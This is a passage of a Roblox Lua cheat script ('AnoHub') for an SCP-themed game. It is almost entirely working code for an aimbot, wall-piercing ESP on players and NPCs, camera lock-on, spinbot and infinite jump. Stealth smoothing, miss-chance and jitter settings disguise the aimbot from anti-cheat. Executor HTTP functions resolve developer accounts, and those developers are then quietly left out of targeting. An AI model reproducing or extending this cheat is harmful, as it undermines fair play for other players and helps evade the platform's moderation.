    function _G.getRoleDisplay(role)
        if not role then return "Neutral" end
        return role:gsub("_"," "):gsub("^%l", string.upper)
    end

    function _G.isRoleVisible(plr)
        local role = _G.getPlayerRole(plr)
        if _G.roleFilter[role] == nil then return true end
        return _G.roleFilter[role]
    end

    function _G.fixHighlight(character)
        if not character then return end
        for _, child in pairs(character:GetChildren()) do
            if child:IsA("Highlight") then child:Destroy() end
        end
    end

    function _G.IsTargetIgnored(plr)
        if not plr then return true end
        if _G.playerWhitelist and _G.playerWhitelist.Enabled then
            for _, name in pairs(_G.playerWhitelist.Players) do
                if plr.Name:lower() == tostring(name):lower() then return true end
            end
        end
        if _G.specialRoleWhitelist and _G.specialRoleWhitelist.Enabled then
            local targetRole = _G.getPlayerRole(plr)
            if _G.specialRoleWhitelist.Roles[targetRole] then return true end
        end
        if not _G.aimbotSettings.WhitelistEnabled then return false end
        local myRole = _G.getPlayerRole(_G.LocalPlayer)
        local targetRole = _G.getPlayerRole(plr)
        if _G.aimbotIgnoreList[myRole] then
            for _, ignoredRole in pairs(_G.aimbotIgnoreList[myRole]) do
                if targetRole == ignoredRole then return true end
            end
        end
        return false
    end

    function _G.HasLineOfSight(part)
        if not part then return false end
        if not _G.Camera then return false end
        local origin = _G.Camera.CFrame.Position
        local direction = (part.Position - origin)
        local rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude
        local ignoreList = {}
        if _G.LocalPlayer.Character then table.insert(ignoreList, _G.LocalPlayer.Character) end
        for _, plr in pairs(_G.Players:GetPlayers()) do
            if plr.Character then table.insert(ignoreList, plr.Character) end
        end
        rayParams.FilterDescendantsInstances = ignoreList
        local result = _G.Workspace:Raycast(origin, direction, rayParams)
        if not result then return true end
        if result.Instance:IsDescendantOf(part.Parent) then return true end
        return false
    end

    function _G.CreateAimbotCircle()
        if _G.aimbotFovCircle then _G.aimbotFovCircle:Destroy() end
        if not _G.aimbotSettings.ShowFOVCircle then return end
        local gui = Instance.new("ScreenGui")
        gui.Name = "AimbotFOV"
        gui.ResetOnSpawn = false
        gui.Parent = _G.LocalPlayer:WaitForChild("PlayerGui")
        local fov = _G.aimbotSettings.FOV
        local shape = _G.aimbotSettings.FOVShape
        local col = _G.aimbotSettings.CircleColor
        if shape == "Box" then
            local box = Instance.new("Frame")
            box.Size = UDim2.new(0, fov*2, 0, fov*2)
            box.Position = UDim2.new(0.5, -fov, 0.5, -fov)
            box.BackgroundTransparency = 1
            box.BorderSizePixel = 0
            box.Parent = gui
            local s = Instance.new("UIStroke")
            s.Color = col
            s.Thickness = 2
            s.Transparency = 0.3
            s.Parent = box
            _G.aimbotFovFrame = box
            _G.aimbotFovStroke = s
        else
            local circle = Instance.new("Frame")
            circle.Size = UDim2.new(0, fov*2, 0, fov*2)
            circle.Position = UDim2.new(0.5, -fov, 0.5, -fov)
            circle.BackgroundColor3 = col
            circle.BackgroundTransparency = 0.85
            circle.BorderSizePixel = 0
            circle.Parent = gui
            local c = Instance.new("UICorner")
            c.CornerRadius = UDim.new(1,0)
            c.Parent = circle
            local s = Instance.new("UIStroke")
            s.Color = col
            s.Thickness = 2
            s.Transparency = 0.3
            s.Parent = circle
            _G.aimbotFovFrame = circle
            _G.aimbotFovStroke = s
        end
        _G.aimbotFovCircle = gui
    end

    function _G.RemoveAimbotCircle()
        if _G.aimbotFovCircle then _G.aimbotFovCircle:Destroy() _G.aimbotFovCircle = nil end
        _G.aimbotFovFrame = nil
        _G.aimbotFovStroke = nil
    end

    function _G.AimbotGetTarget()
        if not _G.Camera then return nil end
        local viewport = _G.Camera.ViewportSize
        local center = Vector2.new(viewport.X/2, viewport.Y/2)
        local myCh = _G.LocalPlayer.Character
        local myHrp = myCh and myCh:FindFirstChild("HumanoidRootPart")
        if not myHrp then return nil end

        local myRole = _G.getPlayerRole(_G.LocalPlayer)
        local threatMatrix = {
            ["d_class"] = { mtf=100, security=95, director=90, chaos_insurgency=70, anomaly=60, scientist=30, d_class=10, neutral=5 },
            ["scientist"] = { mtf=100, chaos_insurgency=95, anomaly=90, security=70, director=65, d_class=30, scientist=5, neutral=5 },
            ["security"] = { chaos_insurgency=100, mtf=95, anomaly=90, director=70, d_class=50, security=5, scientist=5, neutral=5 },
            ["mtf"] = { chaos_insurgency=100, anomaly=95, d_class=60, director=30, security=20, mtf=5, scientist=5, neutral=5 },
            ["chaos_insurgency"] = { mtf=100, security=95, director=90, anomaly=50, d_class=40, scientist=30, chaos_insurgency=5, neutral=5 },
            ["director"] = { chaos_insurgency=100, anomaly=95, mtf=85, security=80, d_class=60, scientist=10, director=5, neutral=5 },
            ["anomaly"] = { mtf=100, chaos_insurgency=95, director=85, security=80, d_class=40, scientist=30, anomaly=50, neutral=10 },
            ["neutral"] = { mtf=90, chaos_insurgency=90, anomaly=90, director=85, security=75, d_class=50, scientist=40, neutral=10 },
        }
        local myThreat = threatMatrix[myRole] or threatMatrix["neutral"]

        local candidates = {}
        for _, plr in pairs(_G.Players:GetPlayers()) do
            if plr ~= _G.LocalPlayer then
                if _G.isHiddenDev and _G.isHiddenDev(plr) then continue end
                if _G.IsTargetIgnored(plr) then continue end
                local ch = plr.Character
                if not ch then continue end
                local hum = ch:FindFirstChild("Humanoid")
                if not hum or hum.Health <= 0 then continue end

                if _G.aimbotSettings.TagFilterEnabled then
                    local hasAny = false
                    for tag, on in pairs(_G.aimbotSettings.TagFilter) do
                        if on and _G.CollectionService:HasTag(ch, tag) then hasAny = true break end
                    end
                    if not hasAny then continue end
                end
                if _G.aimbotSettings.TagBlacklistEnabled then
                    local blocked = false
                    for tag, on in pairs(_G.aimbotSettings.TagBlacklist) do
                        if on and _G.CollectionService:HasTag(ch, tag) then blocked = true break end
                    end
                    if blocked then continue end
                end

                local part = ch:FindFirstChild(_G.aimbotSettings.AimPart)
                if not part then part = ch:FindFirstChild("HumanoidRootPart") end
                if not part then continue end

                local pos, onScreen = _G.Camera:WorldToViewportPoint(part.Position)
                if not onScreen then continue end
                if _G.aimbotSettings.WallCheck and not _G.HasLineOfSight(part) then continue end

                local worldDist = (part.Position - myHrp.Position).Magnitude
                if worldDist > _G.aimbotSettings.MaxRange then continue end

                local screenDist = (Vector2.new(pos.X, pos.Y) - center).Magnitude
                if not _G.aimbotSettings.FOVIgnore and screenDist > _G.aimbotSettings.FOV then continue end

                local targetRole = _G.getPlayerRole(plr)
                local score = myThreat[targetRole] or 50
                local hpRatio = hum.Health / hum.MaxHealth
                score = score + (1 - hpRatio) * 20
                score = score + math.max(0, 50 - (worldDist / 10))

                if ch:FindFirstChildWhichIsA("Tool") then score = score + 30 end

                table.insert(candidates, {
                    plr = plr, part = part, hum = hum,
                    screenDist = screenDist, worldDist = worldDist,
                    hp = hum.Health, threatScore = score,
                })
            end
        end

        if #candidates == 0 then return nil end
        local priority = _G.aimbotSettings.Priority
        if priority == "Center" then
            table.sort(candidates, function(a,b) return a.screenDist < b.screenDist end)
        elseif priority == "Nearest" then
            table.sort(candidates, function(a,b) return a.worldDist < b.worldDist end)
        elseif priority == "Lowest HP" then
            table.sort(candidates, function(a,b) return a.hp < b.hp end)
        elseif priority == "Highest HP" then
            table.sort(candidates, function(a,b) return a.hp > b.hp end)
        elseif priority == "Threat" then
            table.sort(candidates, function(a,b)
                if math.abs(a.threatScore - b.threatScore) < 5 then
                    return a.screenDist < b.screenDist
                end
                return a.threatScore > b.threatScore
            end)
        elseif priority == "Random" then
            for i = #candidates, 2, -1 do
                local j = math.random(i)
                candidates[i], candidates[j] = candidates[j], candidates[i]
            end
        end
        return candidates[1].plr
    end

    _G.aimbotState = _G.aimbotState or { firstAim = true, targetLockedAt = 0, lastTarget = nil }

    local function applySmoothingCurve(t)
        t = math.clamp(t, 0, 1)
        local curve = _G.aimbotSettings.HumanLikeSmoothing
        if curve == "EaseIn" then return t * t
        elseif curve == "EaseOut" then return 1 - (1 - t) * (1 - t)
        elseif curve == "Exponential" then return t * t * t end
        return t
    end

    function _G.AimbotAimAt(plr)
        if not plr then return end
        local ch = plr.Character
        if not ch then return end
        local part = ch:FindFirstChild(_G.aimbotSettings.AimPart)
        if not part then part = ch:FindFirstChild("HumanoidRootPart") end
        if not part then return end
        if not _G.Camera then return end

        local targetPos = part.Position
        local current = _G.Camera.CFrame
        local target = CFrame.new(current.Position, targetPos)

        local effSmooth = _G.aimbotSettings.Smooth
        if _G.aimbotSettings.StealthMode and _G.aimbotState.firstAim then
            effSmooth = effSmooth * 3
        end
        if _G.aimbotSettings.AimMode == "Rage" then
            effSmooth = math.max(1, effSmooth / 5)
        end

        local alpha = 1 / math.max(1, effSmooth)
        alpha = applySmoothingCurve(alpha)

        if _G.aimbotSettings.MissChance > 0 then
            if math.random(1, 100) <= _G.aimbotSettings.MissChance then
                local missOffset = Vector3.new(math.random(-30,30), math.random(-20,20), math.random(-30,30))
                target = CFrame.new(current.Position, targetPos + missOffset)
            end
        end

        if _G.aimbotSettings.RandomJitter > 0 then
            local j = _G.aimbotSettings.RandomJitter
            target = target * CFrame.new(math.random(-j,j)*0.01, math.random(-j,j)*0.01, 0)
        end

        _G.Camera.CFrame = current:Lerp(target, alpha)

        if _G.aimbotState.firstAim and _G.aimbotState.targetLockedAt > 0 then
            if tick() - _G.aimbotState.targetLockedAt > 2 then
                _G.aimbotState.firstAim = false
            end
        end
    end

    _G.aimbotFrameSkip = 0
    function _G.AimbotOnTick()
        _G.aimbotFrameSkip = _G.aimbotFrameSkip + 1
        if _G.aimbotFrameSkip % 2 ~= 0 then return end
        if not _G.aimbotSettings.Enabled then return end

        local key = _G.aimbotSettings.AimKey
        local held = false
        if key == "Always" then held = true
        elseif key == "MouseButton2" then held = _G.rmbHeld
        elseif key == "MouseButton1" then held = _G.lmbHeld
        elseif key == "E" then held = _G.UserInputService:IsKeyDown(Enum.KeyCode.E)
        elseif key == "Q" then held = _G.UserInputService:IsKeyDown(Enum.KeyCode.Q)
        elseif key == "F" then held = _G.UserInputService:IsKeyDown(Enum.KeyCode.F) end

        local mobileHeld = _G.mobileAimbotBtnHeld and _G.mobileAimbotGui and _G.mobileAimbotGui.Parent
        if not (held or mobileHeld) then
            _G.rmbHeld = false
            _G.aimbotState.targetLockedAt = 0
            return
        end

        if _G.aimbotState.targetLockedAt == 0 then
            _G.aimbotState.targetLockedAt = tick() + (_G.aimbotSettings.AimDelay / 1000)
        end
        if tick() < _G.aimbotState.targetLockedAt then return end

        local target = _G.AimbotGetTarget()
        if target then
            if _G.aimbotState.lastTarget ~= target then
                _G.aimbotState.lastTarget = target
                _G.aimbotState.targetLockedAt = 0
            end
            _G.AimbotAimAt(target)
        else
            _G.aimbotState.lastTarget = nil
            _G.aimbotState.targetLockedAt = 0
        end
    end

    if not _G.aimbotConnection then
        _G.aimbotConnection = _G.RunService.RenderStepped:Connect(_G.AimbotOnTick)
    end

    _G.UserInputService.InputBegan:Connect(function(input, gp)
        if gp then return end
        if input.UserInputType == Enum.UserInputType.MouseButton2 then _G.rmbHeld = true end
        if input.UserInputType == Enum.UserInputType.MouseButton1 then _G.lmbHeld = true end
    end)
    _G.UserInputService.InputEnded:Connect(function(input, gp)
        if gp then return end
        if input.UserInputType == Enum.UserInputType.MouseButton2 then _G.rmbHeld = false end
        if input.UserInputType == Enum.UserInputType.MouseButton1 then _G.lmbHeld = false end
    end)

    _G.infiniteJumpConn = _G.UserInputService.JumpRequest:Connect(function()
        if _G.infiniteJumpActive then
            local ch = _G.LocalPlayer.Character
            if ch then
                local hum = ch:FindFirstChild("Humanoid")
                if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
            end
        end
    end)

    _G.LocalPlayer.CharacterAdded:Connect(function()
        local hum = _G.LocalPlayer.Character:WaitForChild("Humanoid", 5)
        if hum then
            hum.Died:Connect(function()
                _G.statsCounter.deaths = _G.statsCounter.deaths + 1
            end)
        end
    end)

    function _G.getClosestPlayer()
        if not _G.Camera then return nil end
        local char = _G.LocalPlayer.Character
        if not char then return nil end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end
        local origin = hrp.Position
        local closest = nil
        local closestDist = math.huge
        for _, plr in pairs(_G.Players:GetPlayers()) do
            if plr ~= _G.LocalPlayer then
                if _G.isHiddenDev and _G.isHiddenDev(plr) then continue end
                local ch = plr.Character
                if ch and ch:FindFirstChild("HumanoidRootPart") and ch:FindFirstChild("Humanoid") and ch.Humanoid.Health > 0 then
                    local targetHrp = ch.HumanoidRootPart
                    local screenPos, onScreen = _G.Camera:WorldToViewportPoint(targetHrp.Position)
                    if onScreen then
                        local dist = (targetHrp.Position - origin).Magnitude
                        if dist < closestDist then closestDist = dist closest = plr end
                    end
                end
            end
        end
        return closest
    end

    function _G.clearLockOn()
        if _G.lockOnHighlight then _G.lockOnHighlight:Destroy() _G.lockOnHighlight = nil end
        if _G.lockOnConnection then _G.lockOnConnection:Disconnect() _G.lockOnConnection = nil end
        _G.lockOnTarget = nil
    end

    function _G.setLockOnTarget(plr)
        _G.clearLockOn()
        _G.lockOnTarget = plr
        if not plr then return end
        local ch = plr.Character
        if not ch then return end
        _G.fixHighlight(ch)
        local root = ch:FindFirstChild("HumanoidRootPart")
        if not root then return end
        _G.lockOnHighlight = Instance.new("Highlight")
        _G.lockOnHighlight.Name = "AnoHubLockOn"
        _G.lockOnHighlight.Parent = ch
        _G.lockOnHighlight.FillColor = Color3.fromRGB(215, 110, 0)
        _G.lockOnHighlight.FillTransparency = 0.5
        _G.lockOnHighlight.OutlineColor = Color3.fromRGB(215, 110, 0)
        _G.lockOnHighlight.OutlineTransparency = 0
        _G.lockOnHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        _G.lockOnConnection = _G.RunService.RenderStepped:Connect(function()
            if not _G.lockOnTarget or not _G.lockOnTarget.Character then _G.clearLockOn() return end
            local ch = _G.lockOnTarget.Character
            local root = ch:FindFirstChild("HumanoidRootPart")
            if not root then _G.clearLockOn() return end
            local myCh = _G.LocalPlayer.Character
            if myCh and _G.Camera then
                local myHrp = myCh:FindFirstChild("HumanoidRootPart")
                if myHrp then
                    pcall(function()
                        _G.Camera.CFrame = CFrame.new(_G.Camera.CFrame.Position, root.Position)
                    end)
                end
            end
        end)
    end

    _G.spinbotConn = nil
    function _G.startSpinbot()
        if _G.spinbotConn then _G.spinbotConn:Disconnect() end
        _G.spinbotConn = _G.RunService.Heartbeat:Connect(function()
            if not _G.aimbotSettings.Spinbot then return end
            local ch = _G.LocalPlayer.Character
            if not ch then return end
            local hrp = ch:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local speed = math.rad(_G.aimbotSettings.SpinSpeed)
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0, speed, 0)
        end)
    end
    function _G.stopSpinbot()
        if _G.spinbotConn then _G.spinbotConn:Disconnect() _G.spinbotConn = nil end
    end

    local function resolveAllDevs()
        local toResolve = {}
        for _, username in ipairs(CONFIG.DevUsernames or {}) do
            if type(username) == "string" and username ~= "" then
                local found = false
                for _, plr in ipairs(KeyPlayers:GetPlayers()) do
                    if plr.Name:lower() == username:lower() then
                        CONFIG.DevUsers[plr.UserId] = plr.Name
                        found = true
                        break
                    end
                end
                if not found then
                    table.insert(toResolve, username)
                end
            end
        end

        if #toResolve == 0 then return end

        local req = (syn and syn.request) or (http and http.request) or http_request or request
        if not req then return end

        task.spawn(function()
            pcall(function()
                local body = _G.HttpService:JSONEncode({ usernames = toResolve, excludeBannedUsers = false })
                local response = req({
                    Url = "https://users.roblox.com/v1/usernames/users",
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = body,
                })

                if not response then return end

                local respBody = response.Body or response.body
                if not respBody then return end

                local data = _G.HttpService:JSONDecode(respBody)
                if data and data.data then
                    for _, entry in ipairs(data.data) do
                        if entry.id and entry.name then
                            CONFIG.DevUsers[entry.id] = entry.name
                            print("[AnoHub] Dev resolved: " .. entry.name .. " -> " .. entry.id)
                        end
                    end
                end
            end)
        end)
    end

    resolveAllDevs()

    KeyPlayers.PlayerAdded:Connect(function(plr)
        for _, username in ipairs(CONFIG.DevUsernames or {}) do
            if type(username) == "string" and plr.Name:lower() == username:lower() then
                CONFIG.DevUsers[plr.UserId] = plr.Name
            end
        end
    end)
end

print("[AnoHub] Part 1/4 loaded")
do
    local Library = _G.Library
    local Tabs = _G.Tabs
    local Workspace = _G.Workspace
    local Players = _G.Players
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local Camera = _G.Camera
    local ScriptConfig = _G.ScriptConfig
    local ToggleButton = _G.ToggleButton
    local ToggleStroke = _G.ToggleStroke
    local ThemeManager = _G.ThemeManager
    local espObjs = _G.espObjs
    local espConns = _G.espConns
    local espOptions = _G.espOptions
    local roleColors = _G.roleColors
    local npcESPObjects = _G.npcESPObjects
    local statsCounter = _G.statsCounter

    local function buildESPText(plr)
        local parts = {}
        if _G.isAnoHubUser and _G.isAnoHubUser(plr) and espOptions.anoHub then
            table.insert(parts, "[ANOHUB]")
        end
        if espOptions.rank then
            local rank = _G.getPlayerRank(plr)
            if rank ~= "" then table.insert(parts, rank) end
        end
        if espOptions.name then table.insert(parts, plr.Name) end
        if espOptions.role then
            table.insert(parts, "[" .. _G.getRoleDisplay(_G.getPlayerRole(plr)) .. "]")
        end
        if espOptions.tags then
            local tags = _G.getPlayerTags(plr)
            if tags ~= "" then table.insert(parts, tags) end
        end
        if espOptions.distance then
            local myCh = LocalPlayer.Character
            local myHrp = myCh and myCh:FindFirstChild("HumanoidRootPart")
            local targetHrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if myHrp and targetHrp then
                local dist = math.floor((myHrp.Position - targetHrp.Position).Magnitude)
                table.insert(parts, "[" .. dist .. "m]")
            end
        end
        return table.concat(parts, " ")
    end
    _G.buildESPText = buildESPText

    local function removePlayerESP(plr)
        local conn = espConns[plr]
        if conn then
            pcall(function() conn:Disconnect() end)
            espConns[plr] = nil
        end
        local data = espObjs[plr]
        if data then
            if data.Billboard then pcall(function() data.Billboard:Destroy() end) end
            if data.Highlight then pcall(function() data.Highlight:Destroy() end) end
            espObjs[plr] = nil
        end
        if plr and plr.Character then
            for _, child in pairs(plr.Character:GetChildren()) do
                if child:IsA("Highlight") and child.Name == "AnoHubESP_HL" then
                    pcall(function() child:Destroy() end)
                end
                if child:IsA("BillboardGui") and child.Name == "AnoHubESP_BB" then
                    pcall(function() child:Destroy() end)
                end
            end
        end
    end
    _G.removePlayerESP = removePlayerESP

    local function createPlayerESP(plr)
        if plr == LocalPlayer then return end
        if _G.ESPBlacklist and _G.ESPBlacklist[plr.UserId] then return end
        if _G.isHiddenDev and _G.isHiddenDev(plr) then return end
        if not _G.isRoleVisible(plr) then return end
        removePlayerESP(plr)

        local function build()
            if not _G.espActive then return end
            local ch = plr.Character
            if not ch then return end
            local hum = ch:FindFirstChild("Humanoid")
            local root = ch:FindFirstChild("HumanoidRootPart")
            if not hum or not root then return end

            for _, child in pairs(ch:GetChildren()) do
                if child:IsA("Highlight") and child.Name == "AnoHubESP_HL" then
                    pcall(function() child:Destroy() end)
                end
            end

            local color = _G.getDisplayRoleColor(plr)
            if _G.isCreator(plr) then color = Color3.fromRGB(255,50,200) end
            if _G.isAnoHubUser and _G.isAnoHubUser(plr) and espOptions.anoHub then
                color = Color3.fromRGB(215, 110, 0)
            end

            local bb = Instance.new("BillboardGui")
            bb.Name = "AnoHubESP_BB"
            bb.Size = UDim2.new(0, 220, 0, 40)
            bb.StudsOffset = Vector3.new(0, 3, 0)
            bb.AlwaysOnTop = true
            bb.Parent = root

            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(1, 0, 0, 16)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Text = buildESPText(plr)
            nameLabel.TextColor3 = color
            nameLabel.TextSize = 11
            nameLabel.Font = Enum.Font.GothamBold
            nameLabel.TextStrokeColor3 = Color3.fromRGB(0,0,0)
            nameLabel.TextStrokeTransparency = 0.4
            nameLabel.Parent = bb

            local healthBg = Instance.new("Frame")
            healthBg.Size = UDim2.new(0, 100, 0, 3)
            healthBg.Position = UDim2.new(0.5, -50, 0, 18)
            healthBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
            healthBg.BorderSizePixel = 0
            healthBg.Parent = bb
            healthBg.Visible = espOptions.health

            local healthBar = Instance.new("Frame")
            healthBar.Size = UDim2.new(1, 0, 1, 0)
            healthBar.BackgroundColor3 = Color3.fromRGB(0,255,0)
            healthBar.BorderSizePixel = 0
            healthBar.Parent = healthBg

            local hl = nil
            if espOptions.highlight then
                hl = Instance.new("Highlight")
                hl.Name = "AnoHubESP_HL"
                hl.Parent = ch
                hl.FillColor = color
                hl.FillTransparency = 0.7
                hl.OutlineColor = color
                hl.OutlineTransparency = 0
                hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                hl.Adornee = ch
            end

            espObjs[plr] = {
                Billboard = bb, Highlight = hl,
                NameLabel = nameLabel,
                HealthBg = healthBg, HealthBar = healthBar,
                Char = ch,
            }
        end

        if plr.Character then build() end

        espConns[plr] = plr.CharacterAdded:Connect(function()
            task.wait(0.5)
            if _G.espActive then build() end
        end)
    end
    _G.createPlayerESP = createPlayerESP

    function _G.espCleanup()
        for plr, conn in pairs(espConns) do
            if conn and conn.Disconnect then
                pcall(function() conn:Disconnect() end)
            end
        end
        espConns = {}
        _G.espConns = espConns

        for plr, _ in pairs(espObjs) do
            pcall(function() removePlayerESP(plr) end)
        end
        espObjs = {}
        _G.espObjs = espObjs

        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                for _, child in pairs(plr.Character:GetChildren()) do
                    if child:IsA("Highlight") and child.Name == "AnoHubESP_HL" then
                        pcall(function() child:Destroy() end)
                    end
                    if child:IsA("BillboardGui") and child.Name == "AnoHubESP_BB" then
                        pcall(function() child:Destroy() end)
                    end
                end
            end
        end

        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("Highlight") and obj.Name == "AnoHubESP_HL" then
                pcall(function() obj:Destroy() end)
            end
        end
    end

    local espUpdateTime = 0
    RunService.Heartbeat:Connect(function()
        if tick() - espUpdateTime < 0.3 then return end
        espUpdateTime = tick()
        if not _G.espActive then return end
        for plr, data in pairs(espObjs) do
            local ch = data.Char
            if not ch or not ch:IsDescendantOf(Workspace) then
                if plr.Character then data.Char = plr.Character end
                continue
            end
            local hum = ch:FindFirstChild("Humanoid")
            if not hum then continue end
            if data.NameLabel then
                data.NameLabel.Text = buildESPText(plr)
                if _G.rainbowHighlightActive then
                    data.NameLabel.TextColor3 = Color3.fromHSV((tick()*0.5)%1, 1, 1)
                elseif _G.isAnoHubUser and _G.isAnoHubUser(plr) and espOptions.anoHub then
                    data.NameLabel.TextColor3 = Color3.fromRGB(215, 110, 0)
                else
                    local c = _G.getDisplayRoleColor(plr)
                    if _G.isCreator(plr) then c = Color3.fromRGB(255,50,200) end
                    data.NameLabel.TextColor3 = c
                end
            end
            if data.HealthBar then
                local npe = hum.Health / hum.MaxHealth
                local nc = Color3.fromRGB(0,255,0)
                if npe < 0.3 then nc = Color3.fromRGB(255,0,0)
                elseif npe < 0.6 then nc = Color3.fromRGB(255,255,0) end
                data.HealthBar.Size = UDim2.new(npe, 0, 1, 0)
                data.HealthBar.BackgroundColor3 = nc
            end
            if data.Highlight then
                if _G.rainbowHighlightActive then
                    local rc = Color3.fromHSV((tick()*0.5)%1, 1, 1)
                    data.Highlight.FillColor = rc
                    data.Highlight.OutlineColor = rc
                elseif _G.isAnoHubUser and _G.isAnoHubUser(plr) and espOptions.anoHub then
                    data.Highlight.FillColor = Color3.fromRGB(215, 110, 0)
                    data.Highlight.OutlineColor = Color3.fromRGB(215, 110, 0)
                else
                    local dc = _G.getDisplayRoleColor(plr)
                    if _G.isCreator(plr) then dc = Color3.fromRGB(255,50,200) end
                    data.Highlight.FillColor = dc
                    data.Highlight.OutlineColor = dc
                end
            end
        end
    end)

    task.spawn(function()
        while task.wait(3) do
            if not _G.espActive then continue end
            for _, plr in pairs(Players:GetPlayers()) do
                if plr == LocalPlayer then continue end
                if _G.ESPBlacklist and _G.ESPBlacklist[plr.UserId] then continue end
                if _G.isHiddenDev and _G.isHiddenDev(plr) then
                    if espObjs[plr] then removePlayerESP(plr) end
                    continue
                end
                local data = espObjs[plr]
                local ch = plr.Character
                local needsRebuild = false
                if not data then
                    if _G.isRoleVisible(plr) then needsRebuild = true end
                else
                    if not data.Char or not data.Char.Parent then needsRebuild = true
                    elseif ch and data.Char ~= ch then needsRebuild = true
                    elseif not _G.isRoleVisible(plr) then removePlayerESP(plr) end
                end
                if needsRebuild and _G.isRoleVisible(plr) then
                    removePlayerESP(plr)
                    createPlayerESP(plr)
                end
            end
        end
    end)

    local npcESPConns = {}

    local function isNPCTarget(obj)
        if not obj:IsA("Model") then return false end
        if obj == LocalPlayer.Character then return false end
        local plr = Players:GetPlayerFromCharacter(obj)
        if plr then return false end
        for _, otherPlr in pairs(Players:GetPlayers()) do
            if otherPlr.Character == obj then return false end
        end
        if obj.Parent and obj.Parent:IsA("Player") then return false end
        local name = obj.Name:lower()
        if name == "sculpture" or name == "scp-173" or name == "scp_173" or name == "scp173" then return true end
        local hum = obj:FindFirstChildOfClass("Humanoid")
        if not hum then return false end
        if hum.Health <= 0 then return false end
        if hum:GetState() == Enum.HumanoidStateType.Dead then return false end
        if hum:GetState() == Enum.HumanoidStateType.Physics then return false end
        if not obj:FindFirstChild("HumanoidRootPart") then return false end
        return true
    end

    local function removeNPCESP(model)
        if npcESPConns[model] then
            for _, c in pairs(npcESPConns[model]) do
                if c.Disconnect then pcall(function() c:Disconnect() end) end
            end
            npcESPConns[model] = nil
        end
        local data = npcESPObjects[model]
        if data then
            if data.HL then pcall(function() data.HL:Destroy() end) end
            if data.BB then pcall(function() data.BB:Destroy() end) end
            npcESPObjects[model] = nil
        end
        if model then
            for _, child in pairs(model:GetChildren()) do
                if child:IsA("Highlight") and child.Name == "AnoHubNPC_HL" then
                    pcall(function() child:Destroy() end)
                end
                if child:IsA("BillboardGui") and child.Name == "AnoHubNPC_BB" then
                    pcall(function() child:Destroy() end)
                end
            end
        end
    end
    _G.removeNPCESP = removeNPCESP

    local function createNPCESP(model)
        if not _G.npcESPActive then return end
        if npcESPObjects[model] then return end
        if not isNPCTarget(model) then return end

        local root = model:FindFirstChild("HumanoidRootPart")
            or model:FindFirstChild("PrimaryPart")
            or model:FindFirstChildWhichIsA("BasePart", true)
        if not root then return end

        statsCounter.npcsSeen = statsCounter.npcsSeen + 1
        local npcColor = roleColors["npc"] or Color3.fromRGB(85,20,130)

        local hl = Instance.new("Highlight")
        hl.Name = "AnoHubNPC_HL"
        hl.Parent = model
        hl.FillColor = npcColor
        hl.FillTransparency = 0.6
        hl.OutlineColor = npcColor
        hl.OutlineTransparency = 0
        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

        local bb = Instance.new("BillboardGui")
        bb.Name = "AnoHubNPC_BB"
        bb.Size = UDim2.new(0, 220, 0, 40)
        bb.StudsOffset = Vector3.new(0, 3, 0)
        bb.AlwaysOnTop = true
        bb.Parent = root

        local nl = Instance.new("TextLabel")
        nl.Size = UDim2.new(1, 0, 0, 16)
        nl.BackgroundTransparency = 1
        nl.Text = model.Name
        nl.TextColor3 = npcColor
        nl.TextSize = 11
        nl.Font = Enum.Font.GothamBold
        nl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
        nl.TextStrokeTransparency = 0.4
        nl.Parent = bb

        local conns = {}
        local hum = model:FindFirstChildOfClass("Humanoid")
        if hum then
            table.insert(conns, hum.Died:Connect(function() removeNPCESP(model) end))
        end
        table.insert(conns, model.AncestryChanged:Connect(function(_, parent)
            if not parent then removeNPCESP(model) end
        end))

        npcESPObjects[model] = { HL = hl, BB = bb, NameLabel = nl, Char = model, Root = root }
        npcESPConns[model] = conns
    end
    _G.createNPCESP = createNPCESP

    local function initialNPCScan()
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("Model") and isNPCTarget(obj) then createNPCESP(obj) end
        end
    end
    _G.initialNPCScan = initialNPCScan

    Workspace.DescendantAdded:Connect(function(obj)
        if not _G.npcESPActive then return end
        if not obj:IsA("Model") then return end
        task.wait(0.15)
        if obj.Parent and isNPCTarget(obj) then createNPCESP(obj) end
    end)

    Workspace.DescendantRemoving:Connect(function(obj)
        if npcESPObjects[obj] then removeNPCESP(obj) end
    end)

    RunService.Heartbeat:Connect(function()
        if not _G.npcESPActive then return end
        for model, _ in pairs(npcESPObjects) do
            if not model.Parent then removeNPCESP(model)
            else
                local hum = model:FindFirstChildOfClass("Humanoid")
                if hum and hum.Health <= 0 then removeNPCESP(model) end
            end
        end
    end)

    if not _G.spectateGui then
        _G.spectateGui = Instance.new("ScreenGui")
        _G.spectateGui.Name = "AnoHubSpectateName"
        _G.spectateGui.ResetOnSpawn = false
        _G.spectateGui.IgnoreGuiInset = true
        _G.spectateGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

        _G.spectateFrame = Instance.new("Frame")
        _G.spectateFrame.Size = UDim2.new(0, 400, 0, 60)
        _G.spectateFrame.Position = UDim2.new(0.5, -200, 0, 20)
        _G.spectateFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
        _G.spectateFrame.BackgroundTransparency = 0.3
        _G.spectateFrame.BorderSizePixel = 0
        _G.spectateFrame.Visible = false
        _G.spectateFrame.Parent = _G.spectateGui
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0,10)
        corner.Parent = _G.spectateFrame
        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(215, 110, 0)
        stroke.Thickness = 2
        stroke.Transparency = 0.3
